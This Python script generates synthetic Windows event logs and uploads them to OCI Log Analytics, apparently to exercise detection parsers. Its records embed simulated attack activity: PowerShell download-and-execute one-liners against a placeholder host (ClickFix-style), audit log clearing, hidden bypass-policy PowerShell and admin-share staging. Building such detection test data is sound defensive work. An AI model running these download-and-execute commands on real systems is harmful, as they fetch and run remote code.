#!/usr/bin/env python3
"""Generate and ingest official-shaped Windows Event Log synthetic records.

The records preserve the Windows Event XML shape translated into JSON:
``Event.System`` plus ``Event.EventData.Data[{Name, #text}]``.  They also
carry top-level parser aliases so the repository's existing OCI Log Analytics
JSON parsers can ingest the same files without a second deployment path.
"""

from __future__ import annotations

import argparse
import io
import json
import sys
from dataclasses import dataclass
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).resolve().parent))

import oci

from oci_config import (  # noqa: E402
    PROJECT_DIR,
    get_la_client,
    get_namespace,
    ensure_log_group,
    list_available_log_sources,
    resolve_compartment_id,
    resolve_source_from_candidates,
    SOURCE_CANDIDATE_GROUPS,
)


BASE_TIME = datetime(2026, 5, 30, 10, 0, tzinfo=timezone.utc)
DEFAULT_OUT_DIR = Path(PROJECT_DIR) / "test_data" / "windows_eventlog_synthetic"


@dataclass(frozen=True)
class WindowsChannel:
    filename: str
    source_group: str
    channel: str
    provider: str
    source_display: str
    provider_guid: str = ""
    level: str = "0"
    task: str = "0"
    opcode: str = "0"
    keywords: str = "0x8020000000000000"


CHANNELS = {
    "security": WindowsChannel(
        filename="windows_event_security.jsonl",
        source_group="windows_event_security",
        channel="Security",
        provider="Microsoft-Windows-Security-Auditing",
        provider_guid="{54849625-5478-4994-A5BA-3E3B0328C30D}",
        source_display="Windows Event Security Logs",
    ),
    "system": WindowsChannel(
        filename="windows_event_system.jsonl",
        source_group="windows_event_system",
        channel="System",
        provider="Service Control Manager",
        source_display="Windows Event System Logs",
    ),
    "powershell": WindowsChannel(
        filename="windows_powershell_operational.jsonl",
        source_group="windows_powershell_operational",
        channel="Microsoft-Windows-PowerShell/Operational",
        provider="Microsoft-Windows-PowerShell",
        provider_guid="{A0C1853B-5C40-4B15-8766-3CF1C58F985A}",
        source_display="Windows PowerShell Operational Logs",
    ),
    "defender": WindowsChannel(
        filename="windows_defender_operational.jsonl",
        source_group="windows_defender_operational",
        channel="Microsoft-Windows-Windows Defender/Operational",
        provider="Microsoft-Windows-Windows Defender",
        source_display="Windows Defender Operational Logs",
    ),
    "sysmon": WindowsChannel(
        filename="sysmon_operational.jsonl",
        source_group="sysmon_operational",
        channel="Microsoft-Windows-Sysmon/Operational",
        provider="Microsoft-Windows-Sysmon",
        provider_guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
        source_display="Windows Sysmon Operational Logs",
    ),
}


def iso_time(offset_minutes: int) -> str:
    return (BASE_TIME + timedelta(minutes=offset_minutes)).isoformat(timespec="milliseconds").replace("+00:00", "Z")


def event_data_pairs(event_data: dict[str, Any]) -> list[dict[str, str]]:
    return [
        {"Name": key, "#text": str(value)}
        for key, value in event_data.items()
        if value not in ("", None)
    ]


def windows_event(
    channel_key: str,
    event_id: int,
    *,
    computer: str,
    user: str,
    event_data: dict[str, Any],
    message: str,
    offset: int,
    record_id: int,
) -> dict[str, Any]:
    """Return an official-shaped Windows event with OCI parser aliases."""
    channel = CHANNELS[channel_key]
    event_time = iso_time(offset)
    system = {
        "Provider": {"Name": channel.provider},
        "EventID": str(event_id),
        "Version": "0",
        "Level": channel.level,
        "Task": channel.task,
        "Opcode": channel.opcode,
        "Keywords": channel.keywords,
        "TimeCreated": {"SystemTime": event_time},
        "EventRecordID": str(record_id),
        "Correlation": {},
        "Execution": {"ProcessID": "704", "ThreadID": "1140"},
        "Channel": channel.channel,
        "Computer": computer,
        "Security": {"UserID": "S-1-5-18"},
    }
    if channel.provider_guid:
        system["Provider"]["Guid"] = channel.provider_guid

    record = {
        "Event": {
            "System": system,
            "EventData": {"Data": event_data_pairs(event_data)},
        },
        "RenderedDescription": message,
        "Log Source": channel.source_display,
        "log_source_identifier": channel.source_display,
        "Event ID": event_id,
        "EventID": str(event_id),
        "TimeCreated": event_time,
        "Computer": computer,
        "Host Name": computer,
        "Host Name (Server)": computer,
        "Entity": computer,
        "Channel": channel.channel,
        "Provider": channel.provider,
        "User": user,
        "User Name": user,
        "msg": message,
    }
    record.update(event_data)
    apply_display_aliases(record)
    return record


def apply_display_aliases(record: dict[str, Any]) -> None:
    """Add Log Analytics display aliases expected by existing parsers and queries."""
    alias_map = {
        "SubjectUserName": "Subject User Name",
        "TargetUserName": "Target User Name",
        "TargetDomainName": "Target Domain Name",
        "IpAddress": "Source Address",
        "SourceAddress": "Source Address",
        "LogonType": "Logon Type",
        "ProcessName": "Process Name",
        "NewProcessName": "Process Name",
        "CommandLine": "Command Line",
        "ObjectName": "Object Name",
        "ObjectType": "Object Type",
        "ObjectServer": "Object Server",
        "AccessMask": "Access Mask",
        "FailureReason": "Failure Reason",
        "SubStatus": "Sub Status",
        "TaskName": "Task Name",
        "ShareName": "Share Name",
        "RelativeTargetName": "Relative Target Name",
        "ServiceName": "Service Name",
        "ServiceFileName": "Service File Name",
        "ScriptBlockText": "Script Block Text",
        "HostApplication": "Host Application",
        "ThreatName": "Threat Name",
        "ThreatID": "Threat ID",
        "DetectionSource": "Detection Source",
        "FilePath": "File Path",
        "UtcTime": "Utc Time",
        "Image": "Process Name",
        "ParentImage": "Parent Process Name",
        "ParentCommandLine": "Parent Command Line",
        "TargetFilename": "Target Filename",
        "Hashes": "Hashes",
        "DestinationIp": "Destination IP",
        "DestinationPort": "Destination Port",
        "PipeName": "Pipe Name",
        "QueryName": "Query Name",
        "QueryResults": "Query Results",
    }
    for native_name, display_name in alias_map.items():
        value = record.get(native_name)
        if value not in ("", None):
            record[display_name] = value
    if record.get("Source Address"):
        record["Source IP"] = record["Source Address"]
    if record.get("Status") and not record.get("Failure Reason"):
        record["Failure Reason"] = record["Status"]


def generate_security_events() -> list[dict[str, Any]]:
    host = "DC01.synthetic.example"
    workstation = "WS01.synthetic.example"
    events = [
        windows_event("security", 4719, computer=host, user="synthetic-admin", offset=1, record_id=1001,
                      message="System audit policy was changed.",
                      event_data={"SubjectUserName": "synthetic-admin", "Category": "Object Access", "Subcategory": "Audit File Share", "ChangeType": "Success Removed"}),
        windows_event("security", 1102, computer=host, user="synthetic-admin", offset=2, record_id=1002,
                      message="The audit log was cleared.",
                      event_data={"SubjectUserName": "synthetic-admin"}),
        windows_event("security", 4698, computer=workstation, user="synthetic-user", offset=3, record_id=1003,
                      message="A scheduled task was created.",
                      event_data={"SubjectUserName": "synthetic-user", "TaskName": "\\Microsoft\\Windows\\Update\\SyntheticCache", "CommandLine": "C:\\Windows\\Temp\\synthetic-cache.exe"}),
        windows_event("security", 4702, computer=workstation, user="synthetic-user", offset=4, record_id=1004,
                      message="A scheduled task was updated.",
                      event_data={"SubjectUserName": "synthetic-user", "TaskName": "\\Microsoft\\Windows\\WDI\\SyntheticDiagnostic", "CommandLine": "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass"}),
        windows_event("security", 4697, computer=workstation, user="synthetic-admin", offset=5, record_id=1005,
                      message="A service was installed in the system.",
                      event_data={"SubjectUserName": "synthetic-admin", "ServiceName": "SyntheticUpdate", "ServiceFileName": "C:\\Windows\\Temp\\synthetic-update.exe"}),
        windows_event("security", 4728, computer=host, user="synthetic-admin", offset=10, record_id=1010,
                      message="A member was added to a security-enabled global group.",
                      event_data={"SubjectUserName": "synthetic-admin", "TargetUserName": "Domain Admins", "MemberName": "CN=synthetic-user,CN=Users,DC=synthetic,DC=example"}),
        windows_event("security", 4688, computer=workstation, user="synthetic-user", offset=12, record_id=1012,
                      message="A new process has been created.",
                      event_data={"SubjectUserName": "synthetic-user", "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"# ClickFix fake CAPTCHA; iwr https://synthetic.example/p.ps1 | iex\""}),
    ]
    for index in range(4):
        events.append(
            windows_event("security", 4771, computer=host, user="sql_svc", offset=6 + index, record_id=1100 + index,
                          message="Kerberos pre-authentication failed.",
                          event_data={"TargetUserName": "sql_svc", "TargetDomainName": "SYNTHETIC", "Status": "0x18", "IpAddress": "192.0.2.45", "SourceAddress": "192.0.2.45"})
        )
        events.append(
            windows_event("security", 4776, computer=host, user="backup_svc", offset=14 + index, record_id=1200 + index,
                          message="The computer attempted to validate the credentials for an account.",
                          event_data={"TargetUserName": "backup_svc", "Workstation": "SYNTH-WS01", "Status": "0xC000006A", "SourceAddress": "192.0.2.46"})
        )
        events.append(
            windows_event("security", 4798 if index % 2 == 0 else 4799, computer=workstation, user="synthetic-user", offset=24 + index, record_id=1400 + index,
                          message="A user or local group membership was enumerated.",
                          event_data={"SubjectUserName": "synthetic-user", "TargetUserName": "Administrator", "SourceAddress": "192.0.2.48"})
        )
    share_events = [
        (5140, "\\\\*\\C$", ""),
        (5145, "\\\\*\\ADMIN$", "Temp\\synthetic.exe"),
        (5145, "\\\\*\\C$", "Windows\\Temp\\synthetic-stage.ps1"),
    ]
    for index, (event_id, share_name, target_name) in enumerate(share_events):
        events.append(
            windows_event("security", event_id, computer=workstation, user="synthetic-user", offset=18 + index, record_id=1300 + index,
                          message="A network share object was accessed.",
                          event_data={"SubjectUserName": "synthetic-user", "ShareName": share_name, "RelativeTargetName": target_name, "AccessMask": "0x12019f", "IpAddress": "192.0.2.47", "SourceAddress": "192.0.2.47"})
        )
    return events


def generate_system_events() -> list[dict[str, Any]]:
    return [
        windows_event("system", 7045, computer="WS01.synthetic.example", user="SYSTEM", offset=20, record_id=2001,
                      message="A service was installed in the system.",
                      event_data={"ServiceName": "SyntheticUpdate", "ServiceFileName": "C:\\Windows\\Temp\\synthetic-update.exe"}),
        windows_event("system", 104, computer="WS01.synthetic.example", user="synthetic-admin", offset=21, record_id=2002,
                      message="The System log file was cleared.",
                      event_data={"SubjectUserName": "synthetic-admin"}),
    ]


def generate_powershell_events() -> list[dict[str, Any]]:
    script = "IEX(New-Object Net.WebClient).DownloadString('https://synthetic.example/stage.ps1') # ClickFix fake CAPTCHA clipboard instruction"
    return [
        windows_event("powershell", 4104, computer="WS01.synthetic.example", user="synthetic-user", offset=30, record_id=3001,
                      message="Creating Scriptblock text.",
                      event_data={"ScriptBlockText": script, "ScriptBlockId": "synthetic-scriptblock-001", "HostApplication": "powershell.exe -NoProfile -ExecutionPolicy Bypass", "ProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -NoProfile -ExecutionPolicy Bypass"}),
        windows_event("powershell", 4103, computer="WS01.synthetic.example", user="synthetic-user", offset=31, record_id=3002,
                      message="PowerShell pipeline execution details.",
                      event_data={"ScriptBlockText": "Get-ADUser -Filter * -Properties *", "HostApplication": "powershell.exe", "ProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}),
    ]


def generate_defender_events() -> list[dict[str, Any]]:
    return [
        windows_event("defender", 1116, computer="WS01.synthetic.example", user="SYSTEM", offset=40, record_id=4001,
                      message="Microsoft Defender Antivirus detected malware.",
                      event_data={"ThreatName": "Trojan:Win32/Synthetic", "ThreatID": "2147712345", "Action": "Detected", "Status": "Active", "Severity": "High", "DetectionSource": "Real-Time Protection", "FilePath": "C:\\Users\\Public\\synthetic.exe"}),
        windows_event("defender", 1117, computer="WS01.synthetic.example", user="SYSTEM", offset=41, record_id=4002,
                      message="Microsoft Defender Antivirus took action to protect this machine.",
                      event_data={"ThreatName": "Trojan:Win32/Synthetic", "ThreatID": "2147712345", "Action": "Quarantined", "Status": "Remediated", "Severity": "High", "DetectionSource": "Real-Time Protection", "FilePath": "C:\\Users\\Public\\synthetic.exe"}),
        windows_event("defender", 5007, computer="WS01.synthetic.example", user="SYSTEM", offset=42, record_id=4003,
                      message="Microsoft Defender Antivirus configuration has changed.",
                      event_data={"ThreatName": "Defender Configuration Change", "ThreatID": "0", "Action": "ConfigurationChanged", "Status": "Changed", "Severity": "Medium", "DetectionSource": "Configuration", "FilePath": "HKLM\\SOFTWARE\\Microsoft\\Windows Defender"}),
    ]


def generate_sysmon_events() -> list[dict[str, Any]]:
    return [
        windows_event("sysmon", 29, computer="WS01.synthetic.example", user="synthetic-user", offset=50, record_id=5001,
                      message="File executable detected.",
                      event_data={"UtcTime": iso_time(50), "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\Public\\Downloads\\synthetic-viewer.exe", "Hashes": "SHA256=SYNTHETIC"}),
        windows_event("sysmon", 11, computer="WS01.synthetic.example", user="synthetic-user", offset=51, record_id=5002,
                      message="File created.",
                      event_data={"UtcTime": iso_time(51), "Image": "C:\\Windows\\System32\\cmd.exe", "TargetFilename": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\synthetic-updater.exe", "Hashes": "SHA256=SYNTHETIC"}),
        windows_event("sysmon", 1, computer="WS01.synthetic.example", user="synthetic-user", offset=52, record_id=5003,
                      message="Process Create.",
                      event_data={"UtcTime": iso_time(52), "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentCommandLine": "chrome.exe https://synthetic.example/captcha", "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"# ClickFix fake CAPTCHA; iwr https://synthetic.example/p.ps1 | iex\""}),
    ]


def generate_all() -> dict[str, list[dict[str, Any]]]:
    return {
        CHANNELS["security"].filename: generate_security_events(),
        CHANNELS["system"].filename: generate_system_events(),
        CHANNELS["powershell"].filename: generate_powershell_events(),
        CHANNELS["defender"].filename: generate_defender_events(),
        CHANNELS["sysmon"].filename: generate_sysmon_events(),
    }


def validate_record(record: dict[str, Any]) -> list[str]:
    errors = []
    event = record.get("Event")
    if not isinstance(event, dict):
        return ["missing Event envelope"]
    system = event.get("System", {})
    event_data = event.get("EventData", {}).get("Data", [])
    if not system.get("Provider", {}).get("Name"):
        errors.append("missing Event.System.Provider.Name")
    if str(system.get("EventID", "")) != str(record.get("EventID", "")):
        errors.append("Event.System.EventID does not match top-level EventID")
    if system.get("TimeCreated", {}).get("SystemTime") != record.get("TimeCreated"):
        errors.append("Event.System.TimeCreated.SystemTime does not match top-level TimeCreated")
    if not isinstance(event_data, list) or not all("Name" in item and "#text" in item for item in event_data):
        errors.append("Event.EventData.Data must be a list of Name/#text pairs")
    for required in ("Log Source", "Event ID", "Computer", "Host Name (Server)", "msg"):
        if required not in record:
            errors.append(f"missing parser alias {required}")
    return errors


def validate_files(out_dir: Path, filenames: list[str] | None = None) -> dict[str, list[str]]:
    targets = filenames or sorted(generate_all())
    report = {}
    for filename in targets:
        path = out_dir / filename
        file_errors = []
        if not path.exists():
            report[filename] = [f"missing file: {path}"]
            continue
        for line_number, line in enumerate(path.read_text().splitlines(), start=1):
            try:
                record = json.loads(line)
            except json.JSONDecodeError as exc:
                file_errors.append(f"line {line_number}: invalid JSON: {exc}")
                continue
            for error in validate_record(record):
                file_errors.append(f"line {line_number}: {error}")
        report[filename] = file_errors
    return report


def write_files(out_dir: Path, datasets: dict[str, list[dict[str, Any]]]) -> dict[str, int]:
    out_dir.mkdir(parents=True, exist_ok=True)
    counts = {}
    for filename, records in datasets.items():
        with (out_dir / filename).open("w", encoding="utf-8") as handle:
            for record in records:
                handle.write(json.dumps(record, sort_keys=True) + "\n")
        counts[filename] = len(records)
    manifest = {
        "schema_version": "1.0.0",
        "generated_at": datetime.now(timezone.utc).isoformat(timespec="seconds"),
        "source": "windows_eventlog_synthetic.py",
        "files": {filename: {"event_count": count} for filename, count in sorted(counts.items())},
    }
    (out_dir / "manifest.json").write_text(json.dumps(manifest, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    return counts


def upload_file(la_client: Any, namespace: str, log_group_id: str, source_name: str, path: Path) -> bool:
    with path.open("rb") as handle:
        body = io.BytesIO(handle.read())
    response = la_client.upload_log_file(
        namespace_name=namespace,
        upload_name=f"windows-eventlog-synthetic-{path.stem}",
        log_source_name=source_name,
        filename=path.name,
        opc_meta_loggrpid=log_group_id,
        upload_log_file_body=body,
        content_type="application/octet-stream",
        char_encoding="UTF-8",
    )
    print(f"uploaded {path.name}: status={response.status} source={source_name}")
    return 200 <= int(response.status) < 300


def ingest(out_dir: Path, filenames: list[str] | None = None, dry_run: bool = False) -> int:
    validation = validate_files(out_dir, filenames)
    failed = {name: errors for name, errors in validation.items() if errors}
    if failed:
        for name, errors in failed.items():
            print(f"{name}: validation failed")
            for error in errors:
                print(f"  - {error}")
        return 2

    channel_by_filename = {channel.filename: channel for channel in CHANNELS.values()}
    targets = filenames or sorted(channel_by_filename)
    if dry_run:
        for filename in targets:
            group = channel_by_filename[filename].source_group
            print(f"dry-run {filename}: candidates={SOURCE_CANDIDATE_GROUPS[group]}")
        return 0

    la_client = get_la_client()
    namespace = get_namespace(la_client)
    log_group_id = ensure_log_group(la_client, namespace)
    available_sources = list_available_log_sources(la_client, namespace, resolve_compartment_id())

    ok = True
    for filename in targets:
        path = out_dir / filename
        group = channel_by_filename[filename].source_group
        source_name = resolve_source_from_candidates(available_sources, SOURCE_CANDIDATE_GROUPS[group])
        if not source_name:
            source_name = SOURCE_CANDIDATE_GROUPS[group][0]
            print(f"warn: no candidate found for {filename}; trying {source_name}")
        ok = upload_file(la_client, namespace, log_group_id, source_name, path) and ok
    return 0 if ok else 1


def print_validation_report(report: dict[str, list[str]]) -> int:
    ok = True
    for filename, errors in sorted(report.items()):
        if errors:
            ok = False
            print(f"{filename}: FAIL")
            for error in errors:
                print(f"  - {error}")
        else:
            print(f"{filename}: OK")
    return 0 if ok else 1


def main() -> int:
    parser = argparse.ArgumentParser(description="Generate official-shaped Windows Event Log synthetic data")
    subparsers = parser.add_subparsers(dest="command", required=True)

    gen = subparsers.add_parser("generate", help="Write synthetic Windows event log JSONL files")
    gen.add_argument("--out-dir", type=Path, default=DEFAULT_OUT_DIR)

    val = subparsers.add_parser("validate", help="Validate generated Windows event log JSONL files")
    val.add_argument("--out-dir", type=Path, default=DEFAULT_OUT_DIR)
    val.add_argument("--files", nargs="*", default=None)

    ing = subparsers.add_parser("ingest", help="Upload generated files to OCI Log Analytics")
    ing.add_argument("--out-dir", type=Path, default=DEFAULT_OUT_DIR)
    ing.add_argument("--files", nargs="*", default=None)
    ing.add_argument("--dry-run", action="store_true")

    args = parser.parse_args()

    if args.command == "generate":
        counts = write_files(args.out_dir, generate_all())
        for filename, count in sorted(counts.items()):
            print(f"{filename}: {count} events")
        return print_validation_report(validate_files(args.out_dir))
    if args.command == "validate":
        return print_validation_report(validate_files(args.out_dir, args.files))
    if args.command == "ingest":
        return ingest(args.out_dir, args.files, args.dry_run)
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
